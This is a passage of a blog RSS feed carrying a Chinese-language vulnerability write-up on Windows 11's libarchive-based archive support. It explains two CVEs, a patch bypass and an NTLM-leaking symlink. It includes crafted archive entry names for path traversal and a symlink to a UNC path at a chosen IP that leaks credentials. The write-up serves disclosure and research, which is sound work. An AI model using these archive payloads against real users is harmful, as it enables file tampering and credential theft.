  &lt;li&gt;&lt;a href=&quot;https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7&quot;&gt;Certipy 4.0: ESC9 &amp;amp; ESC10, BloodHound GUI, New Authentication and Request Methods — and more!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d&quot;&gt;Certificates and Pwnage and Patches, Oh My!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/?ref=heartburn.dev&quot;&gt;Relaying to AD Certificate Services over RPC&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm&quot;&gt;ESC12 – Shell access to ADCS CA with YubiHSM&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53&quot;&gt;ADCS ESC13 Abuse Technique&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9&quot;&gt;ADCS ESC14 Abuse Technique&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc&quot;&gt;EKUwu: Not just another AD CS ESC&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2025/04/10/taking-over-the-entire-domain-in-minutes-what-have-you-overlooked-in-active-directory/</link>
                <guid>https://devco.re/blog/2025/04/10/taking-over-the-entire-domain-in-minutes-what-have-you-overlooked-in-active-directory</guid>
                <pubDate>Thu, 10 Apr 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>全境擴散：從 Windows 11 到 Libarchive 的 Half-Day 威脅與全面影響</title>
                <description>&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;
&lt;p&gt;Windows 11 在 2023 年 10 月發布的更新中，新增了對 RAR、7z 等多達 11 種壓縮格式的支援，使用者可以在原生的檔案總管內操作這些格式的檔案，大幅提升了便利性。然而，這一改進同時也引入了潛在的資安風險。Windows 11 使用老牌開源專案 libarchive 來實現多種壓縮格式的支援，該專案被廣泛使用在 Linux、BSD、macOS 等作業系統，以及 ClickHouse、Homebrew、Osquery 等等知名大型專案中。自 2016 起，Google 的 OSS-Fuzz 專案便 24 小時不間斷地對其進行模糊測試，是歷經時間考驗的函式庫。&lt;/p&gt;

&lt;p&gt;然而，在 OSS-Fuzz 執行的模糊測試中，libarchive 的覆蓋率並不理想。除了 Microsoft Offensive Research &amp;amp; Security Engineering (MORSE) 在 2024 年 1 月自行揭露的兩個遠端程式碼執行漏洞（RCE）之外，我們仍透過程式碼審查與模糊測試發現了 libarchive 中的數個弱點。其中包括位於 RAR 解壓縮程式碼中的 Heap Buffer Overflow 漏洞，以及因 Windows 未對 libarchive 的執行結果進行妥善檢查，導致的任意檔案寫入和任意檔案刪除的漏洞。此外，我們也將在本文中揭露 libarchive 與 Windows 結合後產生的諸多神奇特性。&lt;/p&gt;

&lt;p&gt;而每當 libarchive 這類廣泛使用的函式庫存在弱點時，其風險往往滲透到各個層面，影響難以估計。加上當 Microsoft 為 Windows 進行修補時，相應的 patch 並不會立即回饋到 libarchive 中，這使得攻擊者能夠通過分析 patch 找出漏洞位置，並在漏洞修補的空窗期，利用該漏洞對其他使用 libarchive 的專案進行攻擊。所以最後，我們將以 ClickHouse 為例，說明如何在 libarchive 尚未獲得修補時，在看似不受影響的 ClickHouse 中觸發尚未修補的漏洞。&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;在 Windows 11 的 KB5031455 更新之前，Windows 原生僅支援 ZIP 格式的壓縮檔案。ZIP 在檔案總管中顯示的類型是「Compressed (zipped) Folder」，使用者可以直接點兩下 ZIP 來查看其包含什麼檔案，甚至可以直接開啟檔案或是加入新的檔案。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;「Compressed (zipped) Folder」讓使用者可以在不解壓縮的情況下瀏覽壓縮檔案內的清單，並且對檔案點兩下就可以直接使用，例如直接點擊兩下開啟文字檔案：
&lt;img src=&quot;/assets/img/blog/20250212/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這是因為當使用者點兩下壓縮檔案內的檔案時，檔案總管會將該檔案解壓縮到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; 目錄下的一個以隨機 UUID 命名的暫存資料夾中，實際上是從該暫存位置開啟檔案。由於這是暫存檔案，稍後會自動刪除：
&lt;img src=&quot;/assets/img/blog/20250212/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;compressed-archived-folder&quot;&gt;Compressed Archived folder&lt;/h3&gt;

&lt;p&gt;接著，Windows 11 在 2023 年 10 月的 KB5031455 更新之後支援了 11 種新的壓縮檔案格式：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此類的檔案在檔案總管中顯示的類型是「Compressed Archive Folder」：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由於非常好奇 Windows 11 是透過什麼方式來支援這 11 種新的壓縮格式，我們開始分析檔案總管以及相關的 DLL 檔案。檔案總管對 ZIP 的原生支援是由 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 這支 DLL 所負責的。在 KB5031455 更新之後，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 中多出了一個叫做 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArchiveFolder&lt;/code&gt; 的 Class，有別於原本用以支援 ZIP 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CZipFolder&lt;/code&gt; Class。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;第一個漏洞cve-2024-26185&quot;&gt;第一個漏洞：CVE-2024-26185&lt;/h3&gt;

&lt;p&gt;在進行逆向分析之前，我們首先對新的「Compressed Archive Folder」進行了簡單的黑箱測試。講到壓縮檔案，那絕對要測試一下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;第一次測試，我們構造一個名稱為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..\poc.txt&lt;/code&gt; 的檔案，並壓縮成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rar&lt;/code&gt;，接著上傳至 Windows 主機後點兩下進行瀏覽。結果是，我們僅會在檔案總管中看到一個空的資料夾，並沒有造成任何 Path Traversal：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第二次測試，構造一個名稱為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123\..\poc.txt&lt;/code&gt; 的檔案，並壓縮成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rar&lt;/code&gt;，上傳至 Windows 主機後點兩下進行瀏覽。因為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt; 與 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123&lt;/code&gt; 抵銷的關係，只會在檔案總管中看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; 一個檔案：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; 中對應的暫存檔案也並未逃逸至上層目錄：
&lt;img src=&quot;/assets/img/blog/20250212/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;除了點兩下互動之外，在檔案總管中對「Compressed (zipped) Folder」或是 「Compressed Archive Folder」類型的檔案按右鍵可以看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; 的選項，這個選項會嘗試將整個壓縮檔案解壓縮，透過這個選項我們再進行一次測試。&lt;/p&gt;

&lt;p&gt;這次，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..\poc.txt&lt;/code&gt; 被認為會逃逸到上層目錄，所以檔案總管給出一個 Error：
&lt;img src=&quot;/assets/img/blog/20250212/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123\..\poc.txt&lt;/code&gt; 則解壓縮成功，但一樣只會解壓縮出 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20250212/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; 是直接解壓縮整個檔案，因此我們認為「當檔案包含絕對路徑時」也需要測試一下：
&lt;img src=&quot;/assets/img/blog/20250212/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以發現，透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; 解壓縮確實有包含資料夾，不過，資料夾 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; 被重新命名成了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C_&lt;/code&gt; 資料夾。因此我們可以知道，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 有對特殊字元進行處理來避免解壓縮時的 Path Traversal 與 Arbitrary File Write。
&lt;img src=&quot;/assets/img/blog/20250212/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但當我們「點兩下」包含絕對路徑的 RAR 檔案進行測試時，卻看到一個叫做 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Local Disk (C:)&lt;/code&gt; 的資料夾！&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; 並沒有被替換成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C_&lt;/code&gt;！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果我們進到資料夾的最內層，並且把 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; 檔案打開，看似一切正常：
&lt;img src=&quot;/assets/img/blog/20250212/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但其實，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; 下多出了不應該存在的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc&lt;/code&gt; 資料夾！
&lt;img src=&quot;/assets/img/blog/20250212/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;表示檔案總管誤認為此處是用來暫放檔案的地方，因此 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc&lt;/code&gt; 資料夾中也包含我們剛才打開的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; 檔案：
&lt;img src=&quot;/assets/img/blog/20250212/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也就是說，我們找到了一個 Arbitrary File Write 的漏洞！且由於寫入的目的是放置暫存檔案來進行互動，所以在經過一段時間或是使用者結束瀏覽時就會被刪除，因此我們實際上找到的是一個任意檔案寫/刪除的漏洞。不過稍微稍微可惜的是，任意檔案寫與任意檔案刪除所使用的權限是當前使用者的權限。&lt;/p&gt;

&lt;p&gt;這就是 &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26185&quot;&gt;CVE-2024-26185&lt;/a&gt;：一個好笑但沒什麼用處的漏洞。因為如果要利用此漏洞創建或刪除特定位置的檔案，那就必須在壓縮檔中建立出相同的路徑，接著還需要誘騙使用者打開所有資料夾後，點擊兩下目標檔案才行，正常人點到一半就會覺得哪裡怪怪的了。&lt;/p&gt;

&lt;p&gt;話是這麼說，但根據規則，微軟還是得付我 1,000 美金，好耶。
&lt;img src=&quot;/assets/img/blog/20250212/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-26185成因&quot;&gt;CVE-2024-26185：成因&lt;/h3&gt;

&lt;p&gt;剛才發現的 CVE-2024-26185，成因是因為沒有正確的對檔案名稱進行過濾。逆向之後我們發現，在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 中，進行解壓縮之前會呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; 進行過濾。這個 function 將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;*:&amp;lt;&amp;gt;?|&lt;/code&gt; 等字元替換為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt;、將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; 替換成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;。此外，與「Compressed (zipped) Folder」或 「Compressed Archive Folder」互動時，使用者總共有三個方式可以進行解壓縮，這三個行為各自觸發了不同的 function，分別是：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;點兩下壓縮檔案中的檔案
    &lt;ul&gt;
      &lt;li&gt;觸發 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;點兩下壓縮檔案中的 cmd、bat、exe 檔案
    &lt;ul&gt;
      &lt;li&gt;觸發 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractEntireArchive&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;對壓縮檔案點擊右鍵，點擊選單中的「Extract All」
    &lt;ul&gt;
      &lt;li&gt;觸發 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArchiveExtractWizard::ExtractToDestination&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;逆向這些函數之後我們發現，它們都使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_next_header&lt;/code&gt; 取得壓縮檔內的檔案名稱，並呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; 對名稱進行過濾。但卻忘記在「點兩下壓縮檔案中的檔案」對應的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt; 中做這件事情，導致任意檔案寫、任意檔案刪除的發生。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-38165-繞過-cve-2024-26185-的修補&quot;&gt;CVE-2024-38165： 繞過 CVE-2024-26185 的修補&lt;/h3&gt;

&lt;p&gt;在微軟修復 CVE-2024-26185 之後，我們稍微對 patch 進行了檢查，隨機的執行了一些 PoC，結果發現其中一些還是可以繞過 Windows 最新的 patch，讓我們來看看微軟是怎麼修復上一個漏洞的。&lt;/p&gt;

&lt;p&gt;在 patch 之後，可以發現微軟在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt; 之前加入了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; 來對傳入的路徑進行過濾，看起來沒什麼問題。
&lt;img src=&quot;/assets/img/blog/20250212/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但實際上，我們可以透過檔案名稱為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt; 的檔案繞過這個保護。首先 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt; 會先被傳入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; 進行過濾，但由於名稱中不包含任何非法字元所以沒有產生變化：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下來，由於目前&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 正在做的事情是「將檔案解壓縮至 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; 下的資料夾，讓使用者與檔案互動」，因此 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 需要將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; 下的暫存資料夾路徑和我們提供的檔案名稱串接起來：
&lt;img src=&quot;/assets/img/blog/20250212/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 Windows 中，開頭為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&lt;/code&gt; 或是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; 開頭的路徑都被視為根路徑，所以實際上，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 正在串接兩個絕對路徑。而根據 &lt;a href=&quot;https://github.com/microsoft/STL/blob/90820002693fe6eaaec2e55884472c654186207e/stl/inc/filesystem#L723&quot;&gt;Path 的串接在 Windows 上的實作&lt;/a&gt;，若遇到兩個輸入都是絕對路徑時，會直接拿取第二個絕對路徑回傳，因此這個 function 的回傳值便是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\poc\poc.txt&lt;/code&gt;，成功繞過保護：
&lt;img src=&quot;/assets/img/blog/20250212/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;symlink-ntlm-exfiltration&quot;&gt;Symlink NTLM Exfiltration&lt;/h3&gt;

&lt;p&gt;在缺少 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; 的情況下，我們當然可以攻擊成功。那麼，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; 本身真的安全嗎？&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; 僅過濾 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;*:&amp;lt;&amp;gt;?|&lt;/code&gt;。我們馬上可以發現，「&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;」是合法的字元，或許我們可以構造出遠端的路徑，導致 NTLM exfiltration 之類的問題，我們嘗試構造此類路徑：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\172.23.176.34\Users\nini\Desktop\sharing\test.txt&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Device\Mup\172.23.176.34\Users\nini\Desktop\sharing\test.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;不過在檔案為 regular file 的情況下，這頂多只會在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; 之下建立相對應的目錄（在修補 CVE-2024-38165 之前才有用），無法存取遠端的檔案系統。然而，如果我們建立一個指向 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\172.23.176.34\poc\poc.txt&lt;/code&gt; 的 symlink，當使用者觸發「Extract All」或是點兩下互動時，檔案總管便會嘗試去與該 IP 的 SMB 進行互動，導致 NTLM leak:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;並且，在尚未解壓縮前，Windows 僅使用副檔名判斷壓縮檔案內的檔案類型，欺騙性極高。以此處為例，我們的 symlink 檔案就被當作 Text Document：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不過，在解壓縮時，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 是透過 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-createsymboliclinka&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateSymbolicLinkA&lt;/code&gt;&lt;/a&gt; 這個 API 來建立 symlink。呼叫的程式必須有高權限才能建立 symlink，而在解壓縮時，檔案總管並不會要求任何權限，而是直接報錯：
&lt;img src=&quot;/assets/img/blog/20250212/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;雖然檔案總管在呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateSymbolicLinkA&lt;/code&gt; 時，有啟用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE&lt;/code&gt;，但手冊中說到必須要開啟開發人員模式，才能使此 flag 作用：
&lt;img src=&quot;/assets/img/blog/20250212/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以目前這個弱點只能用來攻擊管理員或是開發者，感覺還是一個不完整的功能。因此，這個弱點被判定為不優先修復。&lt;/p&gt;

&lt;h2 id=&quot;libarchive&quot;&gt;Libarchive&lt;/h2&gt;

&lt;p&gt;前一部分提到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 負責處理與「Compressed (zipped) Folder」、「Compressed Archive Folder」互動的邏輯。但實際上負責解壓縮的是 libarchive，在 Windows 系統上對應的 DLL 是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt;。 libarchive 被廣泛使用在 Linux、BSD、macOS 等作業系統，以及 ClickHouse、Homebrew、Osquery 等等知名大型專案中。自 2016 起，Google 的 OSS-Fuzz 專案便 24 小時不間斷地對其進行模糊測試，是歷經時間考驗的函式庫。在黑箱測試時，我們觀察到下列幾件有趣的事情。&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-1-windows-supports-file-formats-more-than-they-claimed&quot;&gt;Fun Fact 1: Windows Supports File Formats More Than They Claimed&lt;/h3&gt;

&lt;p&gt;雖然微軟在 KB5031455 更新中宣稱他們新增了以下 11 種壓縮格式的原生支援，但實際上他們所支援的檔案格式遠遠超過 11 種。
&lt;img src=&quot;/assets/img/blog/20250212/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; 中我們看到 Ｗindows 是這樣設定 libarchive 的：
&lt;img src=&quot;/assets/img/blog/20250212/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但實際上，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_all&lt;/code&gt; 會啟用 libarchive 中 ar、cpio、lha、mtree、tar、xar、warc、7zip、cab、rar、rar5、iso9660、zip 等 13 種壓縮檔案格式；&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt; 會啟用 libarchive 中 bzip2、compress、gzip、lzip、lzma、xz、uu、rpm、lrzip、lzop、grzip、lz4、zstd 等 13 種格式。&lt;/p&gt;

&lt;p&gt;由於 format 與 filter 可以同時使用，例如，支援 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.tar.gz&lt;/code&gt; 格式即是同時啟用 format 中的 tar 與 filter 中的 gzip。所以實際上 Windows 11 支援了 13+13+13×13=195 種格式嗎？&lt;/p&gt;

&lt;p&gt;大錯特錯，filter 最多可以串連 25 個，例如：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive.rar.gzip.xz.uu.zstd.uu......&lt;/code&gt; 也就是說 Windows 11 實際上支援了 13+13+13×13²⁵ 種格式，也就是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;91733330193268616658399616035&lt;/code&gt; 種格式！佛心公司！佛心公司！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;也因此，更新後的攻擊面大幅擴展。只要 libarchive 中的任一檔案格式存在漏洞，在 Windows 上都可以被觸發。此外，同時解析多種 filter 時，也可能存在安全弱點。相較於原本僅 11 種格式的情況，潛在風險已大幅增加。&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-2-file-format-confusion&quot;&gt;Fun Fact 2: File Format Confusion&lt;/h3&gt;

&lt;p&gt;使用 libarchive 時，並不需要提供副檔名或是指定格式，libarchive 會根據檔案內容自動辨識當前檔案的格式，接著以對應的方式進行解壓縮。但在啟用 ZIP 的情況下可能會有 File Format Confusion 的狀況發生。舉個例子，如果我們建立一個 demo3.rar，並且裡面放入一個 poc.zip 的檔案，如下圖所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果我們在 Windows 上直接點兩下 demo3.rar 開啟的話，會發現我們僅能看到 poc2.txt 這個文字檔案，其餘的資料夾、檔案，甚至 poc.zip 都不存在。因為 libarchive 將 demo3.rar 誤認為一個 ZIP 檔案！&lt;/p&gt;

&lt;p&gt;為了理解原因，我們首先觀察一下 libarchive 是如何選定檔案格式的。libarchive 會在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;choose_format&lt;/code&gt; 這個函式中，呼叫已啟用的 format 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; 函式，而哪個格式的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; 回傳的數值最高，libarchive 就會將檔案當作該格式處理。
&lt;img src=&quot;/assets/img/blog/20250212/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ar&lt;/code&gt; 為例，如果檔案的起頭是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;!&amp;lt;arch&amp;gt;\n&quot;&lt;/code&gt; 這 8 個字元，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_format_ar_bid&lt;/code&gt; 就會回傳 64，推測是 8𝑏𝑖𝑡𝑠 × 8𝑏𝑦𝑡𝑒𝑠 = 64，看起來好像挺有道理的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接著，看到 RAR 的格式可以發現它最高的分數只會是 30。雖然 30 不知道怎麼算來的，但如果每個檔案格式都是從檔案的起頭開始檢查，應該也很難做出會讓這個機制壞掉的 polyglot，對吧？
&lt;img src=&quot;/assets/img/blog/20250212/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但，libarchive 的 ZIP 中有個神奇的模式：seekable。也就是 ZIP 的 signature 不需要在檔案的開頭，libarchive 會自行去尋找，而 seekable zip 最高的數值為 32:
&lt;img src=&quot;/assets/img/blog/20250212/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;所以當 RAR 壓縮率不足，還保留有 ZIP 的 signature 時，libarchive 會將包有 ZIP 檔案的 RAR 檔案當作 ZIP 來處理。&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-3-sometimes-libarchive-tries-to-spawn-an-external-executable&quot;&gt;Fun Fact 3: Sometimes, Libarchive Tries to Spawn an External Executable&lt;/h3&gt;

&lt;p&gt;在 libarchive 的 source code 中可以發現，如果編譯時缺少一些 library，libarchive 執行時會嘗試直接呼叫外部指令來協助解壓縮：
&lt;img src=&quot;/assets/img/blog/20250212/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

